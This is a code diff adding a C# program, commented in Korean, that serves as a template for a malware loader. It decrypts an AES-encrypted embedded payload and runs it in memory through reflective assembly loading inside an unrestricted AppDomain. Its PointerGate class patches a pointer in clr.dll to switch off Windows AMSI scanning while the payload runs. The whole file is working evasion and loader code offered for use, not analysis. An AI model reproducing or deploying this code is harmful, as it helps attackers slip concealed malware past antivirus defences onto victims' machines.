@@ -1,0 +1,266 @@
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security;
+using System.Security.Cryptography;
+using System.Security.Permissions;
+
+internal static class Program
+{
+    // 이 템플릿은 두 경로를 지원한다.
+    // 1) 외부 loader가 AppDomain 슬롯으로 payload를 전달한 최초 실행
+    // 2) 설치된 Client.exe가 자체 리소스에서 payload를 읽는 재실행
+    private static readonly byte[] KeyMaterial = Convert.FromBase64String("__KEY__");
+    private static readonly byte[] IvMaterial = Convert.FromBase64String("__IV__");
+    private const string PayloadResourceName = "__PAYLOAD_RESOURCE__";
+    private const string WarmupResourceName = "__WARMUP_RESOURCE__";
+
+    [STAThread]
+    private static int Main(string[] commandLine)
+    {
+        // 최초 실행에서는 외부 loader가 전달한 복호화 바이트를 즉시 사용한다.
+        byte[] image = (byte[])AppDomain.CurrentDomain.GetData("__IMAGE_SLOT__");
+        string[] arguments = (string[])AppDomain.CurrentDomain.GetData("__ARGUMENT_SLOT__");
+        if (image != null)
+            return ExecuteInMemory(image, arguments ?? new string[0]);
+
+        // 전달된 바이트가 없으면 설치 후 재실행이므로 runner 내부 암호화 리소스를 사용한다.
+        byte[] encrypted = ReadPayload();
+        try
+        {
+            image = DecryptPayload(encrypted);
+            return ExecuteIsolated(image, commandLine ?? new string[0]);
+        }
+        finally
+        {
+            Array.Clear(encrypted, 0, encrypted.Length);
+            if (image != null)
+                Array.Clear(image, 0, image.Length);
+        }
+    }
+
+    private static int ExecuteInMemory(byte[] image, string[] arguments)
+    {
+        try
+        {
+            // 운영체제 로더나 별도 프로세스 주입 없이 CLR에서 managed assembly를 직접 로드한다.
+            Assembly module = Assembly.Load(image);
+            NormalizeMappedImage(module);
+            // sample.exe가 원래 가진 Entry Point와 명령행 인수 형식을 그대로 호출한다.
+            MethodInfo entry = module.EntryPoint;
+            if (entry == null)
+                return 2;
+            object[] invocationArguments = entry.GetParameters().Length == 0
+                ? null
+                : new object[] { arguments ?? new string[0] };
+            object result = entry.Invoke(null, invocationArguments);
+            return result is int ? (int)result : 0;
+        }
+        finally
+        {
+            Array.Clear(image, 0, image.Length);
+        }
+    }
+
+    private static int ExecuteIsolated(byte[] image, string[] arguments)
+    {
+        // 설치된 runner는 새 AppDomain에 데이터를 넣고 자기 자신을 다시 진입시킨다.
+        // 재진입한 Main은 위의 최초 실행 경로와 동일하게 ExecuteInMemory를 호출한다.
+        string self = Assembly.GetExecutingAssembly().Location;
+        if (string.IsNullOrEmpty(self))
+            return 2;
+        AppDomainSetup setup = new AppDomainSetup
+        {
+            ApplicationBase = AppDomain.CurrentDomain.BaseDirectory,
+            DisallowBindingRedirects = true,
+            DisallowCodeDownload = true,
+            LoaderOptimization = LoaderOptimization.SingleDomain
+        };
+        PermissionSet permissions = new PermissionSet(PermissionState.Unrestricted);
+        AppDomain isolated = AppDomain.CreateDomain(Guid.NewGuid().ToString("N"), null, setup, permissions);
+        try
+        {
+            isolated.SetData("__IMAGE_SLOT__", image);
+            isolated.SetData("__ARGUMENT_SLOT__", arguments ?? new string[0]);
+            // PointerGate의 변경 범위를 AppDomain 실행 구간으로 한정한다.
+            using (PointerGate gate = PointerGate.Open())
+                return isolated.ExecuteAssembly(self);
+        }
+        finally
+        {
+            try { AppDomain.Unload(isolated); } catch { }
+        }
+    }
+
+    private static byte[] ReadPayload()
+    {
+        // runner 안에는 설치 후 독립 실행에 사용할 동일한 AES 암호문이 포함되어 있다.
+        using (Stream input = Assembly.GetExecutingAssembly().GetManifestResourceStream(PayloadResourceName))
+        {
+            if (input == null || input.Length <= 0 || input.Length > int.MaxValue)
+                throw new InvalidDataException();
+            using (MemoryStream output = new MemoryStream((int)input.Length))
+            {
+                input.CopyTo(output);
+                return output.ToArray();
+            }
+        }
+    }
+
+    private static byte[] DecryptPayload(byte[] encrypted)
+    {
+        // Build-Loader.ps1이 생성한 키와 IV로 runner 내장 payload를 메모리에서 복호화한다.
+        using (Aes algorithm = Aes.Create())
+        {
+            algorithm.KeySize = 256;
+            algorithm.BlockSize = 128;
+            algorithm.Mode = CipherMode.CBC;
+            algorithm.Padding = PaddingMode.PKCS7;
+            algorithm.Key = KeyMaterial;
+            algorithm.IV = IvMaterial;
+            using (ICryptoTransform decryptor = algorithm.CreateDecryptor())
+            using (MemoryStream output = new MemoryStream(encrypted.Length))
+            using (CryptoStream crypto = new CryptoStream(output, decryptor, CryptoStreamMode.Write))
+            {
+                crypto.Write(encrypted, 0, encrypted.Length);
+                crypto.FlushFinalBlock();
+                return output.ToArray();
+            }
+        }
+    }
+
+    private static byte[] ReadWarmup()
+    {
+        using (Stream input = Assembly.GetExecutingAssembly().GetManifestResourceStream(WarmupResourceName))
+        {
+            if (input == null || input.Length <= 0 || input.Length > int.MaxValue)
+                throw new InvalidDataException();
+            using (MemoryStream output = new MemoryStream((int)input.Length))
+            {
+                input.CopyTo(output);
+                return output.ToArray();
+            }
+        }
+    }
+
+    private sealed class PointerGate : IDisposable
+    {
+        // LoaderStub과 같은 방식으로 값을 일시 변경하고 using 종료 시 원상 복구한다.
+        private readonly IntPtr field;
+        private readonly IntPtr value;
+        private bool restored;
+
+        private PointerGate(IntPtr field, IntPtr value)
+        {
+            this.field = field;
+            this.value = value;
+        }
+
+        internal static PointerGate Open()
+        {
+            try
+            {
+                byte[] warmup = ReadWarmup();
+                try { Assembly.Load(warmup); }
+                finally { Array.Clear(warmup, 0, warmup.Length); }
+                IntPtr inspection = LoadLibrary("amsi.dll");
+                IntPtr runtime = LoadLibrary("clr.dll");
+                IntPtr original = GetProcAddress(inspection, "AmsiScanBuffer");
+                if (inspection == IntPtr.Zero || runtime == IntPtr.Zero || original == IntPtr.Zero)
+                    return null;
+                IntPtr functionSlot = FindPointer(runtime, original);
+                if (functionSlot == IntPtr.Zero)
+                    return null;
+                IntPtr context = Marshal.ReadIntPtr(IntPtr.Subtract(functionSlot, IntPtr.Size));
+                if (context == IntPtr.Zero)
+                    return null;
+                IntPtr field = IntPtr.Add(context, IntPtr.Size);
+                IntPtr value = Marshal.ReadIntPtr(field);
+                if (value == IntPtr.Zero)
+                    return null;
+                Marshal.WriteIntPtr(field, IntPtr.Zero);
+                return new PointerGate(field, value);
+            }
+            catch { return null; }
+        }
+
+        public void Dispose()
+        {
+            if (restored)
+                return;
+            try { Marshal.WriteIntPtr(field, value); }
+            catch { }
+            restored = true;
+        }
+
+        private static IntPtr FindPointer(IntPtr imageBase, IntPtr value)
+        {
+            int peOffset = Marshal.ReadInt32(imageBase, 0x3c);
+            IntPtr peHeader = IntPtr.Add(imageBase, peOffset);
+            int sectionCount = (ushort)Marshal.ReadInt16(peHeader, 6);
+            int optionalHeaderSize = (ushort)Marshal.ReadInt16(peHeader, 20);
+            IntPtr section = IntPtr.Add(peHeader, 24 + optionalHeaderSize);
+            for (int index = 0; index < sectionCount; index++, section = IntPtr.Add(section, 40))
+            {
+                uint characteristics = unchecked((uint)Marshal.ReadInt32(section, 36));
+                if ((characteristics & 0x80000000u) == 0)
+                    continue;
+                uint virtualSize = unchecked((uint)Marshal.ReadInt32(section, 8));
+                uint virtualAddress = unchecked((uint)Marshal.ReadInt32(section, 12));
+                uint rawSize = unchecked((uint)Marshal.ReadInt32(section, 16));
+                uint size = Math.Max(virtualSize, rawSize);
+                IntPtr start = IntPtr.Add(imageBase, unchecked((int)virtualAddress));
+                for (uint offset = 0; offset + (uint)IntPtr.Size <= size; offset += (uint)IntPtr.Size)
+                {
+                    IntPtr candidate = IntPtr.Add(start, unchecked((int)offset));
+                    if (Marshal.ReadIntPtr(candidate) == value)
+                        return candidate;
+                }
+            }
+            return IntPtr.Zero;
+        }
+    }
+
+    private static void NormalizeMappedImage(Assembly module)
+    {
+        // CLR이 매핑한 section 중 불필요하게 RWX인 영역만 RX로 변경한다.
+        try
+        {
+            IntPtr imageBase = Marshal.GetHINSTANCE(module.ManifestModule);
+            int peOffset = Marshal.ReadInt32(imageBase, 0x3c);
+            IntPtr peHeader = IntPtr.Add(imageBase, peOffset);
+            int sectionCount = (ushort)Marshal.ReadInt16(peHeader, 6);
+            int optionalHeaderSize = (ushort)Marshal.ReadInt16(peHeader, 20);
+            IntPtr section = IntPtr.Add(peHeader, 24 + optionalHeaderSize);
+            for (int index = 0; index < sectionCount; index++, section = IntPtr.Add(section, 40))
+            {
+                uint virtualSize = unchecked((uint)Marshal.ReadInt32(section, 8));
+                uint virtualAddress = unchecked((uint)Marshal.ReadInt32(section, 12));
+                uint rawSize = unchecked((uint)Marshal.ReadInt32(section, 16));
+                uint characteristics = unchecked((uint)Marshal.ReadInt32(section, 36));
+                if ((characteristics & 0x20000000u) == 0 || (characteristics & 0x80000000u) == 0)
+                    continue;
+                uint size = Math.Max(virtualSize, rawSize);
+                if (size == 0)
+                    continue;
+                uint ignored;
+                VirtualProtect(IntPtr.Add(imageBase, unchecked((int)virtualAddress)),
+                    (UIntPtr)size, 0x20, out ignored);
+            }
+        }
+        catch { }
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool VirtualProtect(IntPtr address, UIntPtr size,
+        uint newProtection, out uint oldProtection);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern IntPtr LoadLibrary(string fileName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr module, string procedureName);
+
+}
